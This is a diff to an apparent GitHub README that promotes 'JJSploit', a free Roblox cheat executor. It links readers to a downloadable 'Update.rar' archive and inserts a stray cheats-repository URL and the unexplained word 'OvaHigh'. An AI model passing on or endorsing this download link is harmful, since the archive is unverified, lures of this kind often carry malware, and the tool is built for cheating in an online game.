@@ -3,7 +3,7 @@
 ![jj](https://github.com/user-attachments/assets/3a7fcfb5-e0c2-480f-9fa5-8502d54b9854)
 
 
-[![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blue?style=for-the-badge&logo=download)](https://github.com/GoldB1t/jjsploit/releases/download/Update/Update.rar)  
+[![Download JJSploit][def]](https://github.com/GoldB1t/jjsploit/releases/download/Update/Update.rar)  
 
 ## ❓ **What is JJSploit?**  
 
@@ -29,6 +29,8 @@ Unlike paid executors, **JJSploit is completely FREE** and offers **regular upda
 ---  
 
 ## 📊 **Feature Comparison**  
+https://github.com/notahacker8/RobloxCheats.git
+OvaHigh
 
 | Feature           | JJSploit 🏆 | Other Free Exploits ❌ |  
 |------------------|------------|----------------|  
@@ -73,3 +75,6 @@ Unlike paid executors, **JJSploit is completely FREE** and offers **regular upda
 ⭐ **Love JJSploit?** Don’t forget to **star ⭐ this project** and share it with your friends!  
 
 🔥 **Upgrade your Roblox gameplay with JJSploit today!** 🔥  
+
+
+[def]: https://img.shields.io/badge/Download-JJSploit-blue?style=for-the-badge&logo=download
